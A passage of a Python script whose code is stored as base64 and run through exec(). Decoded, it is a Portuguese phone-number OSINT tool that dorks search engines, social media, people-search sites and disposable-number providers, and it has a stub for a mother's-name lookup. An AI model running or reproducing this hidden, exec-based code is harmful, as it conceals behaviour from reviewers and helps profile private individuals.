CAgICAgICBwcmludCgoIlByb2N1cmFuZG8gcG9yIHt9Li4uIi5mb3JtYXQoZG9ya1sndGl0bGUnXSkpKQogICAgICAgICAgICBmb3IgcmVzdWx0IGluIHNlYXJjaChkb3JrUmVxdWVzdCwgc3RvcD1kb3JrWydzdG9wJ10pOgogICAgICAgICAgICAgICAgcHJpbnQoKCJVUkw6ICIgKyByZXN1bHQpKQoKICAgIGRlZiBvc2ludFNvY2lhbE1lZGlhU2NhbigpOgogICAgICAgIGdsb2JhbCBudW1iZXIKICAgICAgICBnbG9iYWwgaW50ZXJuYXRpb25hbE51bWJlcgogICAgICAgIGdsb2JhbCBjdXN0b21Gb3JtYXR0aW5nCgogICAgICAgIGRvcmtzID0ganNvbi5sb2FkKG9wZW4oJ29zaW50L3NvY2lhbF9tZWRpYXMuanNvbicpKQoKICAgICAgICBmb3IgZG9yayBpbiBkb3JrczoKICAgICAgICAgICAgaWYgY3VzdG9tRm9ybWF0dGluZzoKICAgICAgICAgICAgICAgIGRvcmtSZXF1ZXN0ID0gcmVwbGFjZVZhcmlhYmxlcygKICAgICAgICAgICAgICAgICAgICBkb3JrWydyZXF1ZXN0J10pICsgJyB8IGludGV4dDoie30iJy5mb3JtYXQoY3VzdG9tRm9ybWF0dGluZykKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGRvcmtSZXF1ZXN0ID0gcmVwbGFjZVZhcmlhYmxlcyhkb3JrWydyZXF1ZXN0J10pCgogICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgICgiUHJvY3VyYW5kbyBmb290cHJpbnRzIGVtIHt9Li4uIi5mb3JtYXQoZG9ya1snc2l0ZSddKSkpCgogICAgICAgICAgICBmb3IgcmVzdWx0IGluIHNlYXJjaChkb3JrUmVxdWVzdCwgc3RvcD1kb3JrWydzdG9wJ10pOgogICAgICAgICAgICAgICAgcHJpbnQoKCJVUkw6ICIgKyByZXN1bHQpKQoKICAgIGRlZiBvc2ludERpc3Bvc2FibGVOdW1TY2FuKCk6CiAgICAgICAgZ2xvYmFsIG51bWJlcgoKICAgICAgICBkb3JrcyA9IGpzb24ubG9hZChvcGVuKCdvc2ludC9kaXNwb3NhYmxlX251bV9wcm92aWRlcnMuanNvbicpKQoKICAgICAgICBmb3IgZG9yayBpbiBkb3JrczoKICAgICAgICAgICAgZG9ya1JlcXVlc3QgPSByZXBsYWNlVmFyaWFibGVzKGRvcmtbJ3JlcXVlc3QnXSkKCiAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgKCJQcm9jdXJhbmRvIGZvb3RwcmludHMgZW0ge30uLi4iLmZvcm1hdChkb3JrWydzaXRlJ10pKSkKCiAgICAgICAgICAgIGZvciByZXN1bHQgaW4gc2VhcmNoKGRvcmtSZXF1ZXN0LCBzdG9wPWRvcmtbJ3N0b3AnXSk6CiAgICAgICAgICAgICAgICBwcmludCgoIlJlc3VsdCBmb3VuZDoge30iLmZvcm1hdChkb3JrWydzaXRlJ10pKSkKICAgICAgICAgICAgICAgIHByaW50KCgiVVJMOiAiICsgcmVzdWx0KSkKICAgICAgICAgICAgICAgIGFza0ZvckV4aXQoKQoKICAgIGRlZiBvc2ludFNjYW4ocmVydW49RmFsc2UpOgogICAgICAgIGdsb2JhbCBudW1iZXIKICAgICAgICBnbG9iYWwgbG9jYWxOdW1iZXIKICAgICAgICBnbG9iYWwgaW50ZXJuYXRpb25hbE51bWJlcgogICAgICAgIGdsb2JhbCBudW1iZXJDb3VudHJ5Q29kZQogICAgICAgIGdsb2JhbCBjdXN0b21Gb3JtYXR0aW5nCgogICAgICAgIHByaW50KCdFeGVjdcOnw6NvIGRlIHJlY29uaGVjaW1lbnRvIGRlIGZvb3RwcmludHMgT1NJTlQuLi4nKQoKICAgICAgICBpZiBub3QgcmVydW46CiAgICAgICAgICAgIHByaW50KCgiR2VyYW5kbyBzY2FuIFVSTCBlbSA0MTEuY29tLi4uIikpCiAgICAgICAgICAgIHByaW50KCJTY2FuIFVSTDogaHR0cHM6Ly93d3cuNDExLmNvbS9waG9uZS97fSIuZm9ybWF0KAogICAgICAgICAgICAgICAgaW50ZXJuYXRpb25hbE51bWJlci5yZXBsYWNlKCcrJywgJycpLnJlcGxhY2UoJyAnLCAnLScpKSkKCiAgICAgICAgICAgIGFza2luZ0N1c3RvbVBheWxvYWQgPSBpbnB1dCgKICAgICAgICAgICAgICAgICdWb2PDqiBnb3N0YXJpYSBkZSB1c2FyIHVtIGZvcm1hdG8gYWRpY2lvbmFsIHBhcmEgZXN0ZSBuw7ptZXJvP1t5L25dICcpCgogICAgICAgIGlmIHJlcnVuIG9yIGFza2luZ0N1c3RvbVBheWxvYWQgPT0gJ3knIG9yIGFza2luZ0N1c3RvbVBheWxvYWQgPT0gJ3llcyc6CiAgICAgICAgICAgIGN1c3RvbUZvcm1hdHRpbmcgPSBpbnB1dCgnQ3VzdG9tIGZvcm1hdDogJykKCiAgICAgICAgcHJpbnQoKCdQw6FnaW5hcyBXZWIgZm9vdHByaW50cycpKQoKICAgICAgICBwcmludCgoIlBlc3F1aXNhbmRvIGZvb3RwcmludHMgZW0gcMOhZ2luYXMgZGEgd2ViLi4uIChsaW1pdD0xMCkiKSkKICAgICAgICBpZiBjdXN0b21Gb3JtYXR0aW5nOgogICAgICAgICAgICByZXEgPSAne30gfCBpbnRleHQ6Int9IiB8IGludGV4dDoie30iIHwgaW50ZXh0OiJ7fSInLmZvcm1hdCgKICAgICAgICAgICAgICAgIG51bWJlciwgbnVtYmVyLCBpbnRlcm5hdGlvbmFsTnVtYmVyLCBjdXN0b21Gb3JtYXR0aW5nKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJlcSA9ICd7fSB8IGludGV4dDoie30iIHwgaW50ZXh0OiJ7fSInLmZvcm1hdCgKICAgICAgICAgICAgICAgIG51bWJlciwgbnVtYmVyLCBpbnRlcm5hdGlvbmFsTnVtYmVyKQoKICAgICAgICBmb3IgcmVzdWx0IGluIHNlYXJjaChyZXEsIHN0b3A9MTApOgogICAgICAgICAgICBwcmludCgoIlJlc3VsdGFkbyBlbmNvbnRyYWRvOiAiICsgcmVzdWx0KSkKCiAgICAgICAgcHJpbnQoKCJQcm9jdXJhbmRvIGRvY3VtZW50b3MuLi4gKGxpbWl0PTEwKSIpKQogICAgICAgIGlmIGN1c3RvbUZvcm1hdHRpbmc6CiAgICAgICAgICAgIHJlcSA9ICdbZXh0OmRvYyB8IGV4dDpkb2N4IHwgZXh0Om9kdCB8IGV4dDpwZGYgfCBleHQ6cnRmIHwgZXh0OnN4dyB8IGV4dDpwc3cgfCBleHQ6cHB0IHwgZXh0OnBwdHggfCBleHQ6cHBzIHwgZXh0OmNzdiB8IGV4dDp0eHQgICAgIHwgZXh0Onhsc10gJiYgW2ludGV4dDoie30iXScuZm9ybWF0KAogICAgICAgICAgICAgICAgY3VzdG9tRm9ybWF0dGluZykKICAgICAgICBlbHNlOgogICAgICAgICAgICByZXEgPSAnW2V4dDpkb2MgfCBleHQ6ZG9jeCB8IGV4dDpvZHQgfCBleHQ6cGRmIHwgZXh0OnJ0ZiB8IGV4dDpzeHcgfCBleHQ6cHN3IHwgZXh0OnBwdCB8IGV4dDpwcHR4IHwgZXh0OnBwcyB8IGV4dDpjc3YgfCBleHQ6dHh0IHwgZXh0Onhsc10gJiYgW2ludGV4dDoie30iIHwgaW50ZXh0OiJ7fSJdJy5mb3JtYXQoCiAgICAgICAgICAgICAgICBpbnRlcm5hdGlvbmFsTnVtYmVyLCBsb2NhbE51bWJlcikKICAgICAgICBmb3IgcmVzdWx0IGluIHNlYXJjaChyZXEsIHN0b3A9MTApOgogICAgICAgICAgICBwcmludCgoIlJlc3VsdGFkbyBlbmNvbnRyYWRvOiAiICsgcmVzdWx0KSkKCiAgICAgICAgcHJpbnQoKCdGb290cHJpbnRzIGRlIHJlcHV0YcOnw6NvLi4uJykpCgogICAgICAgIG9zaW50UmVwdXRhdGlvblNjYW4oKQoKICAgICAgICBwcmludCgoIkdlcmFuZG8gVVJMIGVtIHNjYW1jYWxsZmlnaHRlcnMuY29tLi4uIikpCiAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICdodHRwOi8vd3d3LnNjYW1jYWxsZmlnaHRlcnMuY29tL3NlYXJjaC1waG9uZS17fS5odG1sJy5mb3JtYXQobnVtYmVyKSkKCiAgICAgICAgdG1wTnVtQXNrID0gaW5wdXQoCiAgICAgICAgICAgICJWb2PDqiBnb3N0YXJpYSBkZSBwZXNxdWlzYXIgZm9vdHByaW50cyBkZSBwcm92ZWRvcmVzIGRlIG7Dum1lcm9zIHRlbXBvcsOhcmlvcz9beS9uXSIpCgogICAgICAgIGlmIHRtcE51bUFzay5sb3dlcigpICE9ICduJyBhbmQgdG1wTnVtQXNrLmxvd2VyKCkgIT0gJ25vJzoKICAgICAgICAgICAgcHJpbnQoKCdGb290cHJpbnRzIGVtIHByb3ZlZG9yZXMgZGUgbsO6bWVyb3MgdGVtcG9yw6FyaW9zJykpCgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBwcmludCgoIlBlc3F1aXNhbmRvIG7Dum1lcm8gZGUgdGVsZWZvbmUgZW0gdGVtcG9waG9uZS5jb20uLi4iKSkKICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucmVxdWVzdCgKICAgICAgICAgICAgICAgICAgICAiR0VUIiwgImh0dHBzOi8vdGVtcG9waG9uZS5jb20vYXBpL3YxL3Bob25lcyIpCiAgICAgICAgICAgICAgICBkYXRhID0ganNvbi5sb2FkcyhyZXNwb25zZS5jb250ZW50LmRlY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgICAgIGZvciB2b2lwX251bWJlciBpbiBkYXRhWydvYmplY3RzJ106CiAgICAgICAgICAgICAgICAgICAgaWYgdm9pcF9udW1iZXJbJ3Bob25lJ10gPT0gZm9ybWF0TnVtYmVyKG51bWJlcik6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgKCJFbmNvbnRyYWRvIHVtIHByb3ZlZG9yIGRlIG7Dum1lcm8gdGVtcG9yw6FyaW86IHRlbXBvcGhvbmUuY29tIikpCiAgICAgICAgICAgICAgICAgICAgICAgIGFza0ZvckV4aXQoKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwcmludCgoIk7Do28gZm9pIHBvc3PDrXZlbCBhY2Vzc2FyIGEgQVBJIHRlbXBvcGhvbmUuY29tLiBQdWxhbmRvIGV0YXBhLi4uIikpCgogICAgICAgICAgICBvc2ludERpc3Bvc2FibGVOdW1TY2FuKCkKCiAgICAgICAgcHJpbnQoKCdGb290cHJpbnRzIGRlIG3DrWRpYSBzb2NpYWwnKSkKCiAgICAgICAgb3NpbnRTb2NpYWxNZWRpYVNjYW4oKQoKICAgICAgICBwcmludCgoJ0Zvb3RwcmludHMgZGUgbGlzdGFzIHRlbGVmw7RuaWNhcycpKQoKICAgICAgICBpZiBudW1iZXJDb3VudHJ5Q29kZSA9PSAnKzEnOgogICAgICAgICAgICBwcmludCgoIkdlcmFuZG8gVVJMIGVtIFRydWVQZW9wbGVTZWFyY2guY29tLi4uICIpKQogICAgICAgICAgICBwcmludCgnaHR0cHM6Ly93d3cudHJ1ZXBlb3BsZXNlYXJjaC5jb20vcmVzdWx0cz9waG9uZW5vPXt9Jy5mb3JtYXQoCiAgICAgICAgICAgICAgICBpbnRlcm5hdGlvbmFsTnVtYmVyLnJlcGxhY2UoJyAnLCAnJykpKQoKICAgICAgICBvc2ludEluZGl2aWR1YWxTY2FuKCkKCiAgICAgICAgcmV0cnlfaW5wdXQgPSBpbnB1dCgKICAgICAgICAgICAgIlZvY8OqIGdvc3RhcmlhIGRlIGV4ZWN1dGFyIG5vdmFtZW50ZSBhIHZhcnJlZHVyYSBPU0lOVD8gKHBvciBleGVtcGxvLCBwYXJhIHVzYXIgdW0gZm9ybWF0byBkaWZlcmVudGUpW3Mvbl0iKQoKICAgICAgICBpZiByZXRyeV9pbnB1dC5sb3dlcigpID09ICd5JyBvciByZXRyeV9pbnB1dC5sb3dlcigpID09ICd5ZXMnOgogICAgICAgICAgICBvc2ludFNjYW4oVHJ1ZSkKICAgICAgICBlbHNlOgogICAgICAgICAgICByZXR1cm4gLTEKCiAgICBkZWYgYXNrRm9yRXhpdCgpOgogICAgICAgIGlmIG5vdCBvdXRwdXQ6CiAgICAgICAgICAgIHVzZXJfaW5wdXQgPSBpbnB1dCgiQ29udGludWFyIHNjYW5uaW5nP1t5L25dICIpCgogICAgICAgICAgICBpZiB1c2VyX2lucHV0Lmxvd2VyKCkgPT0gJ3knIG9yIHVzZXJfaW5wdXQubG93ZXIoKSA9PSAneWVzJzoKICAgICAgICAgICAgICAgIHJldHVybiAtMQogICAgICAgICAgICBlbHNlOgoKICAgICAgICAgICAgICAgIHN5cy5leGl0KCkKCiAgICBkZWYgc2Nhbk51bWJlcihJbnB1dE51bWJlcik6CiAgICAgICAgZ2xvYmFsIG51bWJlcgogICAgICAgIGdsb2JhbCBsb2NhbE51bWJlcgogICAgICAgIGdsb2JhbCBpbnRlcm5hdGlvbmFsTnVtYmVyCiAgICAgICAgZ2xvYmFsIG51bWJlckNvdW50cnlDb2RlCiAgICAgICAgZ2xvYmFsIG51bWJlckNvdW50cnkKICAgICAgICBjbGVhcigpCiAgICAgICAgcHJpbnQoZiJCdXNjYW5kbyBpbmZvcm1hw6fDtWVzIHBhcmF7Qn0ge2Zvcm1hdE51bWJlcihJbnB1dE51bWJlcil9e0N9Li4uIikKCiAgICAgICAgbG9jYWxTY2FuKElucHV0TnVtYmVyKQoKICAgICAgICBpZiBub3QgJ251bWJlcic6CiAgICAgICAgICAgIHByaW50KChmIkVycm86IG8gbsO6bWVyb3tCfXtmb3JtYXROdW1iZXIoSW5wdXROdW1iZXIpfXtDfSBpbnbDoWxpZG8uIikpCiAgICAgICAgICAgICMgYWdhaW4oKQoKICAgICAgICBudW12ZXJpZnlTY2FuKCkKICAgICAgICBvdmhTY2FuKCkKICAgICAgICBvc2ludFNjYW4oKQoKICAgICAgICBwcmludCgiU2NhbiBjb25jbHXDrWRvLiIpCiAgICAgICAgIyBhZ2FpbigpCgogICAgICAgICMgaWYgbm90IG5vX2Fuc2kgYW5kIG5vdCBvdXRwdXQ6CiAgICAgICAgIyBwcmludChTdHlsZS5SRVNFVF9BTEwpCgogICAgZGVmIGRvd25sb2FkX2ZpbGUodXJsLCB0YXJnZXRfcGF0aCk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBzdHJlYW09VHJ1ZSkKICAgICAgICBoYW5kbGUgPSBvcGVuKHRhcmdldF9wYXRoLCAid2IiKQogICAgICAgIGZvciBjaHVuayBpbiByZXNwb25zZS5pdGVyX2NvbnRlbnQoY2h1bmtfc2l6ZT01MTIpOgogICAgICAgICAgICBpZiBjaHVuazoKICAgICAgICAgICAgICAgIGhhbmRsZS53cml0ZShjaHVuaykKCiAgICAgICAgb3NpbnRGaWxlcyA9IFsKICAgICAgICAgICAgJ2Rpc3Bvc2FibGVfbnVtX3Byb3ZpZGVycy5qc29uJywKICAgICAgICAgICAgJ2luZGl2aWR1YWxzLmpzb24nLAogICAgICAgICAgICAncmVwdXRhdGlvbi5qc29uJywKICAgICAgICAgICAgJ3NvY2lhbF9tZWRpYXMuanNvbicKICAgICAgICBdCgogICAgZGVmIG1haW4oKToKCiAgICAgICAgcmVxdWVzdHMucGFja2FnZXMudXJsbGliMy5kaXNhYmxlX3dhcm5pbmdzKCkKICAgICAgICByZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLnV0aWwuc3NsXy5ERUZBVUxUX0NJUEhFUlMgKz0gJ0hJR0g6IURIOiFhTlVMTCcKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlcXVlc3RzLnBhY2thZ2VzLnVybGxpYjMuY29udHJpYi5weW9wZW5zc2wuREVGQVVMVF9TU0xfQ0lQSEVSX0xJU1QgKz0gJ0hJR0g6IURIOiFhTlVMTCcKICAgICAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6CiAgICAgICAgICAgIHBhc3MKCiAgICBudW1iZXIgPSBpbnB1dChmIntDfVt7R31pe0N9XSBJbmZvcm1lIG9zIG7Dum1lcm9zIChzZW0gZXNwYcOnb3MsIHBhcsOqbnRlc2VzIGUgdHJhw6dvKToge0J9IikKICAgIHNjYW5OdW1iZXIobnVtYmVyKQoKICAgIGRlZiBhZ2FpbigpOgogICAgICAgIGFnYWluID0gaW5wdXQoIlxuIiArIGYne0N9W3tHfSt7Q31dIERlc2VqYSByZWFsaXphciB1bWEgbm92YSBjb25zdWx0YT9be0d9c3tDfS97Un1ue0N9XTogJykKICAgICAgICBpZiBhZ2FpbiA9PSAicyIgb3IgYWdhaW4gPT0gInNpbSI6CiAgICAgICAgICAgIGNsZWFyKCkKICAgICAgICAgICAgbWFpbigpCiAgICAgICAgZWxpZiBhZ2FpbiA9PSAibmFvIiBvciBhZ2FpbiA9PSAibiI6CiAgICAgICAgICAgIHBhc3MKCiAgICBtYWluKCkKCgpkZWYgbm9tZW1hZSgpOgogICAgcHJpbnQoZid7Q317R317cmVzdWx0fXtDfScpCiAgICBwcmludChmJ3tDfVt7R31pe0N9XSBUZW1wb3JhcmlhbWVudGUgT2ZmJykKICAgIHRpbWUuc2xlZXAoMikKICAgIHBhc3MK
'''))
exec(b)
